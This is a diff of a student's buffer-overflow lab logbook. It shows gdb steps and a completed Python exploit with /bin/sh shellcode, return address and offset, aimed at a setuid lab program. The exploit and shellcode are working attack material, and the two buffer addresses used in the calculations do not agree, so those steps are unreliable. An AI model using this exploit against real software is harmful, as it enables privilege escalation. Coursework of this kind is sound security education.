@@ -148,19 +148,106 @@ $ sudo chmod 4755 stack
 1. We compiled and run the given program to see the adresses of the variables in the stack
 
 **gbd stack-L1-dbg:**
+
 ![gbdStack](/Logbooks/img/Week5/gbdStack.png)
 
-**b bof and run:**
+**b bof and run:** (set a break point at function bof(), where the overflow will occur. It stops before the `ebp` register is set to point to the current stack frame)
+
 ![bBofAndRun](/Logbooks/img/Week5/bBofAndRun.png)
 
-**next:**
+**next:** (to execute a few instructions and stop after the `ebp`register is modified to point to the stack frame of the bof() function)
+
 ![next](/Logbooks/img/Week5/next.png)
 
-**p $ebd and p &buffer:**
+**p $ebd and p &buffer:** (get the value of ebp and buffer adress)
+
 ![pEbdAndBuffer](/Logbooks/img/Week5/pEBDAndBuffer.png)
 
 
-2.
+2. A python file, exploit.py, was given so that we can exploit the buffer overflow vulnerability in the target program, but it was given to us incomplete so we had to make some changes.
+
+**exploit.py:** (incomplete file)
+```python
+#!/usr/bin/python3
+import sys
+
+# Replace the content with the actual shellcode
+shellcode= (
+  "\x90\x90\x90\x90"  
+  "\x90\x90\x90\x90"  
+).encode('latin-1')
+
+# Fill the content with NOP's
+content = bytearray(0x90 for i in range(517)) 
+
+##################################################################
+# Put the shellcode somewhere in the payload
+start = 0               # Change this number 
+content[start:start + len(shellcode)] = shellcode
+
+# Decide the return address value 
+# and put it somewhere in the payload
+ret    = 0x00           # Change this number 
+offset = 0              # Change this number 
+
+L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
+content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
+##################################################################
+
+# Write the content to a file
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
+
+3. We made the following changes:
+    - changed the `shellcode` value to the actual shellcode
+    - changed the `start` value to `517 - len(shellcode)`, so that we place the end of the shellcode on the end of the buffer
+    - changed the `ret` value to the adress where we want the program to jump to. We obtained this value by adding to the adress of the start of the buffer ($buffer) the value start (start == (517 - len(shellcode)) == 517 - 27 == 490). (0xffffc9ac + 490((in decimal) == 0x1ea in hexadecimal)) = 0xffffcb96.
+    - changed the `offset` value to 112 that corresponds to the distance between the start of the buffer and the adress of return. ($ebp adress - $buffer address) = (0xffffcad8 - 0xffffca6c) = 6c = 108 in decimal. So this means that $ebp starts at 108 bytes after the buffer and since it occupies 4 bytes we add that amount and we get the value of the offset, 112 bytes
+
+**exploit.py:** (complete version)
+```python
+#!/usr/bin/python3
+import sys
+
+# Replace the content with the actual shellcode
+shellcode= (
+  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+  "\xd2\x31\xc0\xb0\x0b\xcd\x80"  
+).encode('latin-1')
+
+# Fill the content with NOP's
+content = bytearray(0x90 for i in range(517)) 
+
+##################################################################
+# Put the shellcode somewhere in the payload
+start = 517 - len(shellcode)               
+content[start:start + len(shellcode)] = shellcode
+
+# Decide the return address value 
+# and put it somewhere in the payload
+ret    = 0xffffcb96       
+offset = 112              
+
+L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
+content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
+##################################################################
+
+# Write the content to a file
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
+
+5. Running the script, we were able to execute the shellcode by buffer overflowing
+
+```
+$./exploit.py // create the badfile
+$./stack-L1
+```
+
+![Task3.5]()
+
 
 ## Task 4: Launching Attack without Knowing Buffer Size (Level 2)
 
